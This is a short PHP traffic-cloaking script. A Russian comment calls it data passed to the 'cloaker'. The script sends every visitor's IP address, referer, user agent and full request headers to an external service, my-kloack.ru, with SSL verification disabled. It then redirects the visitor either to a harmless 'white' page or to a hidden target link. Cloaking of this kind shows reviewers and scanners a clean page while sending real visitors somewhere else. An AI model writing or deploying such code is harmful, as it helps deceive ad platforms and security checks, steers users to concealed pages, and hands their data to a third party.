<?
 //данные для предачи в клоаку
 $post['ip'] = $_SERVER["REMOTE_ADDR"];
 $post['domain'] = $_SERVER['HTTP_HOST'];
 $post['referer'] = @$_SERVER['HTTP_REFERER'];
 $post['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
 $post['headers'] = json_encode(apache_request_headers());


 $curl = curl_init("http://my-kloack.ru/api/check_ip");
 curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
 curl_setopt($curl, CURLOPT_TIMEOUT, 60);
 curl_setopt($curl, CURLOPT_POST, true);
 curl_setopt($curl, CURLOPT_POSTFIELDS, $post);

 $json_reqest = curl_exec($curl);
 curl_close($curl);
 $api_reqest = json_decode($json_reqest);

if(!@$api_reqest || @$api_reqest->white_link || @$api_reqest->result == 0){
    header('Location: '.$api_reqest->white_link, true, 302);
 }else{
    header('Location: '.$api_reqest->link, true, 302);
 }